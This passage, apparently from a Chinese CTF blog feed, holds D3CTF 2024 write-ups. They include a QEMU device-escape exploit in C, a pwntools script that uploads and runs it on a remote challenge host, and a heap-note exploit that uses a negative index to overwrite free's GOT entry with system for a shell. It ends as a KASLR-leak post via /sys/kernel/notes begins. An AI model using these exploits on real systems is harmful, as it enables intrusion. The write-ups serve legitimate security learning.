class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可能用人会问，在 <code>qemu</code> 中执行 <code>system(&quot;/bin/sh&quot;)</code> 不是无法 <code>getsell</code> 的吗，执行后不会有任何回显。其实是可以 <code>getshell</code> 的，但是需要通过 <code>pwntools</code> 连接后才可以看见回显，其效果如下：  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="我的图图呢">  <h1 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h1><p>题目代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启的保护：  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="我的图图呢">  <p>这题第一眼看上去就感觉是经典的菜单题，但是看了办法没有发现堆上的漏洞，后面发现在输入堆块索引时程序并没有对输入的索引进行检测，导致可以使用负索引。由于没有开启 <code>PIE</code> 且 <code>RELRO</code> 状态为 <code>Partial RELRO</code>，所以我选择劫持 <code>free</code> 的 <code>got</code> 表为 <code>system</code> 然后释放掉一个内容为 <code>sh</code> 的堆块来实现 <code>getshell</code><br>这题的一个难点在于存储堆块指针的地址都是以 <code>8</code> 结尾，导致我们不好泄露地址，经过长时间的查找我找到了可以利用的地址  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="我的图图呢">  <p>所以我选择以这里来泄露 <code>libc</code> 的地址并作为跳板来实现修改 <code>free</code> 的 <code>got</code> 表<br>exp：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>去年的 <code>D3CTF</code> 是我第一次和校队组队参加比赛，当时我的 <code>pwn</code> 水平还停留在栈溢出阶段，完全的被这一些题目给震撼到了。今年再次参加 <code>D3CTF</code>，发现题目能看懂了，花点时间题目能做出来了，看来这一年的努力还是有那么一丢丢作用的，不过还是处于新手阶段，太弱了，哎。比赛期间真的太忙太多事情了，导致没有什么时间做题。<code>qemu</code> 逃逸找到漏洞后发现已经给 <code>xtx</code> 师傅做出来了呜呜呜（太强拉  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>When ELF notes reveal too much</title>
      <link href="/2024/04/17/notes/"/>
      <url>/2024/04/17/notes/</url>
      
        <content type="html"><![CDATA[<p>通常我们对内核的攻击都是基于知道内核各种地址的前提下进行的，为了加大攻击内核的难度， <code>kaslr</code> 由此而生，但内核会很容易泄露有关其位置的信息，如大量内核代码乐于在 <code>printk()</code> 调用中打印出内核指针值。<br>在 大量工作 之后，通过修复内核代码来使用针对指针的特殊格式化指令，并在未设置 <code>kptr_restrict</code> 的情况下拒绝将实际指针值输出到日志中，从而基本解决了这个问题。根据需要还修改了各种 <code>/proc</code> 和 <code>sysfs</code> 文件。随着时间的推移，要想了解特定系统上的内核位置就变得更加困难了，但依然有漏网之鱼可以为我们提供内核的基址<br>这里的主角是 <code>/sys/kernel/notes</code> ，在谷歌上找到的十分简略的描述：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What:/sys/kernel/notes</span><br><span class="line">Date:July 2009</span><br><span class="line">Contact:&lt;linux-kernel@vger.kernel.org&gt;</span><br><span class="line">Description:The /sys/kernel/notes file contains the binary representation</span><br><span class="line">        of the running vmlinux&#x27;s .notes section.</span><br></pre></td></tr></table></figure><p>该部分是包含内核映像的 <code>ELF</code> 文件的一部分，包含有关映像本身的有用信息；任何内核代码都可以使用 <code>ELFNOTE()</code> 宏将数据添加到此部分。<br>接下来直接进入实践，环境来自一个 <code>ret2hbp</code> 的 <code>demo</code>  </p><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><p>启动内核后输入 <code>hexdump -C /sys/kernel/notes</code>  </p><img src="/2024/04/17/notes/1.png" class="" title="我的图图呢">  <p>可以看到这里确实有我们想要的内核地址，为了验证这个地址是否正确，我决定用这个地址来求解这一道题目<br>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 